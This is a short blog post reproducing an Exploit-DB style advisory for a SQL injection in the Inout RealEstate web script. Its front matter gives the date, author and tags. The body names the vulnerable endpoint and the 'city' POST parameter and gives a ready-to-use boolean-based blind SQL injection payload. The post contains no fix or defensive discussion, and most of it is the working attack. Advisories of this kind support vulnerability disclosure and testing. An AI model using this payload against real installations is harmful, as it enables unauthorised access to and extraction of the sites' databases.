---
layout:     post
title:      "Inout RealEstate - SQL Injection"
date:       2019-04-02 12:01
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Inout RealEstate - SQL Injection
# Date: 29.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.inoutscripts.com/products/inout-realestate/
# Demo Site: http://inout-realestate.demo.inoutscripts.net/
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A

----- PoC: SQLi -----

Request: http://localhost/[PATH]/agents/agentlistdetails
Vulnerable Parameter: city (POST)
Payload: brokername=&city=1' RLIKE (SELECT (CASE WHEN (8778=8778) THEN 1
ELSE 0x28 END)) AND 'VZpy'='VZpy&cityname=e&page=1&sortby=1
